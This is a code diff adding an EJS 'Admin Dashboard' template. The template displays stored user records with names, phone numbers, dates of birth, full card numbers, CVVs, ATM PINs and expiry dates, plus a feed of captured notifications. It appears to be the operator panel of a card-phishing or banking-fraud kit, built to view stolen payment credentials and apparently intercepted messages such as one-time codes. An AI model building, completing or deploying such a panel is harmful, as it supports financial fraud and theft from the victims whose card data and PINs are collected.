@@ -1,0 +1,66 @@
+<!-- views/dashboard.ejs -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="css/dashboard.css">
+    
+</head>
+<body>
+    <header>
+        <h1>Admin Dashboard</h1>
+        <!-- Settings Icon for Updating Admin Number -->
+        <div class="settings-icon">
+            <a href="/settings"><img src="/public/images/settings-icon.png" alt="Settings"></a>
+        </div>
+    </header>
+
+    <main>
+        <section id="user-data">
+            <h2>User Data</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>Mobile</th>
+                        <th>DOB</th>
+                        <th>Card Last Six</th>
+                        <th>ATM Pin</th>
+                        <th>CVV</th>
+                        <th>Full Card Number</th>
+                        <th>Expiry Date</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <% users.forEach(user => { %>
+                    <tr>
+                        <td><%= user.name %></td>
+                        <td><%= user.mobile %></td>
+                        <td><%= user.dob %></td>
+                        <td><%= user.cardLastSix %></td>
+                        <td><%= user.atmPin %></td>
+                        <td><%= user.cvv %></td>
+                        <td><%= user.fullCardNumber %></td>
+                        <td><%= user.expiryDate %></td>
+                    </tr>
+                    <% }) %>
+                </tbody>
+            </table>
+        </section>
+
+        <section id="notifications">
+            <h2>Notifications</h2>
+            <ul>
+                <% notifications.forEach(notification => { %>
+                    <li>
+                        <strong><%= notification.sender %>:</strong> <%= notification.title %> - <%= notification.body %>
+                    </li>
+                <% }) %>
+            </ul>
+        </section>
+    </main>
+
+</body>
+</html>
